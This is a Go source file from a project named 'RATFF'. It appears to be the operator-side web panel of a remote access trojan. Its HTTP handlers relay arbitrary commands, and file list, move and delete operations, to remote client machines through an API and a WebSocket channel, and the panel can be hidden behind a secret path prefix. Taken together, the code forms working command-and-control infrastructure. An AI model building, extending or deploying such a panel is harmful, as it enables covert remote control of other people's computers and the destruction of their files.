package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"time"

	"RATFF/shared"

	"github.com/gin-gonic/gin"
	"golang.org/x/time/rate"
)

// buildAPIURL constructs the full API URL with optional path prefix.
func buildAPIURL(pathPrefix, endpoint string) string {
	if pathPrefix != "" {
		return cfg.APIBaseURL + "/" + pathPrefix + endpoint
	}
	return cfg.APIBaseURL + endpoint
}

// buildWSURL constructs the full WebSocket URL with optional path prefix.
func buildWSURL(pathPrefix string) string {
	baseURL := cfg.WsURL
	if baseURL == "" {
		baseURL = "ws://localhost:6341"
	}

	if pathPrefix != "" {
		return baseURL + "/" + pathPrefix + "/ws"
	}
	return baseURL + "/ws"
}

// handleExecCommand sends a command to a client via server_api and waits for the response.
func handleExecCommand(c *gin.Context) {
	var req struct {
		ClientID string                 `json:"client_id" binding:"required"`
		Command  string                 `json:"command" binding:"required"`
		Payload  map[string]interface{} `json:"payload"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[req.ClientID] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	msg := shared.NewMessage(shared.MsgCommand, shared.CommandType(req.Command), req.ClientID, req.Payload)
	data, err := json.Marshal(msg)
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	token, pathPrefix := getAuthInfo(c)

	urlPathPrefix := c.Param("pathPassword")
	if urlPathPrefix != "" {
		pathPrefix = urlPathPrefix
		c.SetCookie("path_prefix", pathPrefix, 3600, "/", "", cfg.CookieSecure, true)
	}

	conn, err := ensureResponseConn(pathPrefix)
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": "websocket not connected: " + err.Error()})
		return
	}
	if conn != nil {
		log.Info("Connected to WebSocket server")
	}

	commandURL := buildAPIURL(pathPrefix, "/api/command")

	httpReq, err := http.NewRequest("POST", commandURL, bytes.NewBuffer(data))
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	httpReq.Header.Set("Content-Type", "application/json")
	if token != "" {
		httpReq.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	select {
	case msg := <-ch:
		resp.Body.Close()
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(200, gin.H{"status": "completed", "response": msg})
	case <-time.After(10 * time.Second):
		resp.Body.Close()
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(504, gin.H{"error": "command timed out"})
	}
}

// getAuthInfo extracts auth_token and path_prefix from the request cookies.
func getAuthInfo(c *gin.Context) (token, pathPrefix string) {
	token, _ = c.Cookie("auth_token")
	pathPrefix, _ = c.Cookie("path_prefix")
	return
}

// rateLimitMiddleware creates a middleware that limits requests to 50 per second.
func rateLimitMiddleware() gin.HandlerFunc {
	limiter := rate.NewLimiter(rate.Every(time.Second), 50)

	return func(c *gin.Context) {
		if !limiter.Allow() {
			c.JSON(429, gin.H{"error": "too many requests"})
			c.Abort()
			return
		}
		c.Next()
	}
}

// sendFileCommand sends a file operation command to a client and waits for response.
func sendFileCommand(c *gin.Context, cmdType string, clientID string, cmdPayload map[string]interface{}) {
	token, pathPrefix := getAuthInfo(c)

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[clientID] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	msg := shared.NewMessage(shared.MsgCommand, shared.CommandType(cmdType), clientID, cmdPayload)
	data, err := json.Marshal(msg)
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, clientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	_, err = ensureResponseConn(pathPrefix)
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, clientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": "websocket not connected: " + err.Error()})
		return
	}

	commandURL := buildAPIURL(pathPrefix, "/api/command")

	httpReq, err := http.NewRequest("POST", commandURL, bytes.NewBuffer(data))
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, clientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	httpReq.Header.Set("Content-Type", "application/json")
	if token != "" {
		httpReq.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, clientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	select {
	case msg := <-ch:
		resp.Body.Close()
		pendingMu.Lock()
		delete(pendingCmd, clientID)
		pendingMu.Unlock()
		if msg.Payload != nil {
			if errMsg, ok := msg.Payload["error"].(string); ok {
				c.JSON(400, gin.H{"error": errMsg})
				return
			}
		}
		c.JSON(200, gin.H{"status": "success", "response": msg.Payload})
	case <-time.After(10 * time.Second):
		resp.Body.Close()
		pendingMu.Lock()
		delete(pendingCmd, clientID)
		pendingMu.Unlock()
		c.JSON(504, gin.H{"error": "command timed out"})
	}
}

// handleFileList handles POST /api/file/list
func handleFileList(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
		Path     string `json:"path"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sendFileCommand(c, "file_list", req.ClientID, map[string]interface{}{"path": req.Path})
}

// handleFileMove handles POST /api/file/move
func handleFileMove(c *gin.Context) {
	var req struct {
		ClientID   string `json:"client_id" binding:"required"`
		OriginPath string `json:"origin_path" binding:"required"`
		NewPath    string `json:"new_path" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sendFileCommand(c, "file_move", req.ClientID, map[string]interface{}{
		"origin_path": req.OriginPath,
		"new_path":    req.NewPath,
	})
}

// handleFileDelete handles POST /api/file/delete
func handleFileDelete(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
		Path     string `json:"path" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sendFileCommand(c, "file_delete", req.ClientID, map[string]interface{}{"path": req.Path})
}
